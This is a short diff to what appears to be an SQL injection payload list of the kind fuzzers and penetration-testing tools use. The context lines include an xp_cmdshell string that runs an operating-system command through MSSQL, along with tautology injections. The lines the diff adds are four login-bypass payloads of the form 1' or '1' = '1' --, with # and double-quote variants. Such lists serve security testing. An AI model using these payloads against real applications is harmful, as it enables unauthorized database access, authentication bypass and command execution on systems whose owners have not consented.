@@ -265,3 +265,7 @@ t'exec master..xp_cmdshell 'nslookup www.google.com'--
 ' or ''='
 ' or 3=3
  or 3=3 --
+1' or '1' = '1' -- 
+1' or '1' = '1' #
+1" or "1" = "1" -- 
+1" or "1" = "1" #
